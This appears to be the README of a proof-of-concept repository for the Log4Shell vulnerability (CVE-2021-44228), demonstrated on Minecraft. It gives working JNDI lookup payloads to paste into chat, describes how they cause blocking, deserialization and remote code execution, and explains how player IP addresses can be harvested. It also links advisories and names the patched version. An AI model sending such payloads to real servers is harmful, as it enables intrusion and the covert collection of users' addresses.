## Introduction

This is a proof of concept of the log4j rce adapted from HyCraftHD.

Here are some links for the CVE-2021-44228:
- https://www.lunasec.io/docs/blog/log4j-zero-day
- https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
- https://github.com/apache/logging-log4j2/pull/608
- https://www.youtube.com/watch?v=JPGola6BamU

This bug affects nearly all log4j2 and maybe log4j1 versions. The recommended version to use is **[2.15.0](https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.15.0)** which fixes the exploit.

## Demonstration with minecraft (which uses log4j2)

### Lag or sending serialized data

- Paste ``${jndi:ldap://127.0.0.1/e}`` in the chat. If there is an open socket on port ``389`` logj4 tries to connect and blocks further communiction until a timeout occurs.
- When using this proof of concept exploit, the log in the console will log ``THIS IS SEND TO THE LOG!!! LOG4J EXPLOIT!`` which is a serialized string object from the ldap server.

- Additionally the malicious ldap server receives every ip address where the message is logged. This means that ip adresses of players on a server can be collected which this exploit.

### RCE

- Paste ``${jndi:ldap://127.0.0.1/exe}`` in the chat. If ``-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`` is set to true the remote code execution will happen.

- Fortunately modern jdks disable remote class loading by default. (https://www.oracle.com/java/technologies/javase/8u121-relnotes.html)
- Old versions may still allow this!!
